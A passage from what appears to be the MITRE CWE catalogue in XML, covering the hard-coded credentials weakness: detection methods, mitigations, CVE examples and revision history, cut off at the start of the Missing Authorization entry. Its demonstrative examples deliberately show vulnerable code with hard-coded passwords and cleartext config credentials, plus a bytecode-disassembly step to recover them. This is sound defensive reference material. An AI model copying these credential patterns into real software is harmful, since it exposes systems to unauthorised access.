               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Other</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
               <Description>This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the product, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>For hard-coded credentials in incoming authentication: use monitoring tools that examine the product's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the product was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Network Sniffer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].</xhtml:p>
                  <xhtml:p>In Windows environments, the Encrypted File System (EFS) may provide some protection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password or key.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If the product must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.</xhtml:p>
                  <xhtml:p>Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For front-end to back-end connections: Three solutions are possible, although none are complete.</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.</xhtml:li>
                        <xhtml:li>Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.</xhtml:li>
                        <xhtml:li>Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-13">
               <Intro_Text>The following code uses a hard-coded password to connect to a database:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>DriverManager.getConnection(url, "scott", "tiger");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>javap -c ConnMngr.class<xhtml:div style="margin-left:1em;">22: ldc #36; //String jdbc:mysql://ixne.com/rxsql<xhtml:br/>24: ldc #38; //String scott<xhtml:br/>26: ldc #17; //String tiger</xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-14">
               <Intro_Text>The following code is an example of an internal hard-coded password in the back-end:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (strcmp(password, "Mew!")) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 printf("Incorrect Password!\n");<xhtml:br/>return(0)</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this "functionality."</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-16">
               <Intro_Text>The following code is an example of an internal hard-coded password in the back-end:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (!password.equals("Mew!")) {<xhtml:div style="margin-left:1em;">return(0)</xhtml:div>}<xhtml:br/>//Diagnostic Mode<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this "functionality."</Body_Text>
            </Demonstrative_Example>

            <Demonstrative_Example Demonstrative_Example_ID="DX-92">
               <Intro_Text>The following code examples attempt to verify a password using a hard-coded cryptographic key.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (strcmp(password,"68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-17">
               <Intro_Text>The following code examples attempt to verify a password using a hard-coded cryptographic key.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public boolean VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">System.out.println("Entering Diagnostic Mode...");<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>System.out.println("Incorrect Password!");<xhtml:br/>return false;</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors used hard-coded credentials in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29953</Reference>
               <Description>Condition Monitor firmware has a maintenance interface with hard-coded credentials</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29953</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29960</Reference>
               <Description>Engineering Workstation uses hard-coded cryptographic keys that could allow for unathorized filesystem access and privilege escalation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29964</Reference>
               <Description>Distributed Control System (DCS) has hard-coded passwords for local shell access</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30997</Reference>
               <Description>Programmable Logic Controller (PLC) has a maintenance service that uses undocumented, hard-coded credentials</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30997</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30314</Reference>
               <Description>Firmware for a Safety Instrumented System (SIS) has hard-coded credentials for access to boot configuration</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30314</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30271</Reference>
               <Description>Remote Terminal Unit (RTU) uses a hard-coded SSH private key that is likely to be used in typical deployments</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30271</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2021-37555</Reference>
	      <Description>Telnet service for IoT feeder for dogs and cats has hard-coded password [REF-1288]</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2021-37555</Link>
	    </Observed_Example>
		<Observed_Example>
		  <Reference>CVE-2021-35033</Reference>
		  <Description>Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port</Description>
		  <Link>https://www.cve.org/CVERecord?id=CVE-2021-35033</Link>
		</Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2012-3503</Reference>
	      <Description>Installation script has a hard-coded secret token value, allowing attackers to bypass authentication</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2012-3503</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2772</Reference>
               <Description>SCADA system uses a hard-coded password to protect back-end database containing authorization information, exploited by Stuxnet worm</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2772</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2073</Reference>
               <Description>FTP server library uses hard-coded usernames and passwords for three default accounts</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2073</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1573</Reference>
               <Description>Chain: Router firmware uses hard-coded username and password for access to debug functionality, which can be used to execute arbitrary code</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1573</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2369</Reference>
               <Description>Server uses hard-coded authentication key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2369</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0961</Reference>
               <Description>Backup product uses hard-coded username and password, allowing attackers to bypass authentication via the RPC interface</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1160</Reference>
               <Description>Security appliance uses hard-coded password allowing attackers to gain root access</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1160</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7142</Reference>
               <Description>Drive encryption product stores hard-coded cryptographic keys for encrypted configuration files in executable programs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-7142</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3716</Reference>
               <Description>VoIP product uses hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3716</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3803</Reference>
               <Description>VoIP product uses hard coded public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3803</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0496</Reference>
               <Description>Backup product contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0496</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC03-J</Entry_ID>
               <Entry_Name>Never hard code sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-798</Entry_ID>
            </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.5</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.5</Entry_Name>
           </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="191"/>
            <Related_Attack_Pattern CAPEC_ID="70"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Key Management Issues&#34; Page 272"/>
            <Reference External_Reference_ID="REF-729"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-798"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1288"/>
            <Reference External_Reference_ID="REF-1304"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
	       <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-01-15</Submission_Date>
               <Submission_Version>1.8</Submission_Version>
               <Submission_ReleaseDate>2010-02-16</Submission_ReleaseDate>
               <Submission_Comment>More abstract entry for hard-coded password and hard-coded cryptographic key.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors, Maintenance_Notes, Potential_Mitigations, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
			   <Contribution_Version>4.10</Contribution_Version>
			   <Contribution_ReleaseDate>2023-01-31</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="862" Name="Missing Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not perform an authorization check when an actor attempts to access a resource or perform an action.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
